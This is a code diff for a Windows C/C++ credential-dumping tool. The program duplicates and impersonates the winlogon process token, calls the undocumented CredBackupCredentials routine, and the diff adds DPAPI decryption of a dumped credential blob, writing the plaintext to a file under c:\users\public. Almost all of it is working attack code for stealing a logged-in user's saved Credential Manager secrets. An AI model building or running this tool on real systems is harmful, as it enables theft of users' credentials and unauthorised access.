@@ -1,5 +1,11 @@
 #include <stdio.h>
 #include <Windows.h>
+#include <dpapi.h>
+#include <iostream>     // std::cout
+#include <fstream>      // std::ifstream
+#include <vector>
+
+#pragma comment(lib, "Crypt32.lib")
 
 typedef BOOL (WINAPI* CredBackupCredentials)(HANDLE Token,
 	LPCWSTR Path,
@@ -13,14 +19,14 @@ int main(int argc, char** argv)
 	int winlogonpid = 1452;
 	int userpid = 3276;
 
-	if (argc != 3) {
-		printf("Usage: bin.exe winlogonpid userpid");
-		return 0;
-	}
-	else {
-		winlogonpid = atoi(argv[1]);
-		userpid = atoi(argv[2]);
-	}
+	//if (argc != 3) {
+	//	printf("Usage: bin.exe winlogonpid userpid");
+	//	return 0;
+	//}
+	//else {
+	//	winlogonpid = atoi(argv[1]);
+	//	userpid = atoi(argv[2]);
+	//}
 
 	CredBackupCredentials pCredBackupCredentials = NULL;
 	HMODULE hAdvapi = GetModuleHandleA("advapi32.dll");
@@ -50,10 +56,12 @@ int main(int argc, char** argv)
 		printf("Open winlogin process token handle failed, %d\n", GetLastError());
 		return 0;
 	}
-
+	//TOKEN_ADJUST_PRIVILEGES
 	printf("duplicating winlogin token\n");
 	HANDLE dupToken = NULL;
-	ret = DuplicateToken(winloginToken, SecurityImpersonation, &dupToken);
+	//ret = DuplicateToken(winloginToken, SecurityImpersonation, &dupToken);
+	//ret = DuplicateTokenEx(winloginToken, TOKEN_IMPERSONATE | TOKEN_ADJUST_PRIVILEGES, NULL, SecurityImpersonation, TokenPrimary, &dupToken);
+	ret = DuplicateTokenEx(winloginToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken);
 	if (ret == FALSE || dupToken == NULL) {
 		printf("duplicate winlogin process token failed, %d\n", GetLastError());
 		return 0;
@@ -76,7 +84,7 @@ int main(int argc, char** argv)
 	ret = AdjustTokenPrivileges(dupToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, NULL);
 	if (ret == FALSE) {
 		printf("AdjustTokenPrivileges failed %d\n", GetLastError());
-		//return 0;
+		return 0;
 	}
 
 	printf("Getting user process\n");
@@ -95,7 +103,9 @@ int main(int argc, char** argv)
 	}
 
 	printf("impersonating winlogin\n");
-	ret = ImpersonateLoggedOnUser(userToken);
+	ret = ImpersonateLoggedOnUser(dupToken);
+	//HANDLE hThread = GetCurrentThread();
+	//ret = SetThreadToken(&hThread, dupToken);
 	if (ret == FALSE) {
 		printf("ImpersonateLoggedOnUser failed, %d\n", GetLastError());
 		return 0;
@@ -108,12 +118,39 @@ int main(int argc, char** argv)
 		return 0;
 	}
 
+	std::ifstream file("c:\\users\\public\\temp.bin", std::ios::binary | std::ios::ate);
+	std::streamsize size = file.tellg();
+	file.seekg(0, std::ios::beg);
+
+	DATA_BLOB DataOut = { 0 };
+	DataOut.cbData = size;
+	DataOut.pbData = (BYTE*)malloc(DataOut.cbData);
+	file.read((char*)DataOut.pbData, DataOut.cbData);
+
+	DATA_BLOB DataVerify = { 0 };
+	LPWSTR pDescrOut = NULL;
+
+	printf("decrypting data\n");
+	ret = CryptUnprotectData(&DataOut, &pDescrOut, NULL, NULL, NULL, 0, &DataVerify);
+	if (ret == FALSE) {
+		printf("CredBackupCredentials failed, %d\n", GetLastError());
+		return 0;
+	}
+
 	printf("reverting back to self\n");
 	ret = RevertToSelf();
 	if (ret == FALSE) {
 		printf("RevertToSelf failed, %d\n", GetLastError());
 		return 0;
 	}
+
+	std::ofstream myfile;
+	myfile.open("c:\\users\\public\\example.bin");
+	myfile.write((const char*)DataVerify.pbData, DataVerify.cbData);
+	myfile.close();
+
+	if (DataOut.pbData)
+		free(DataOut.pbData);
 
 	if (winlogin)
 		CloseHandle(winlogin);
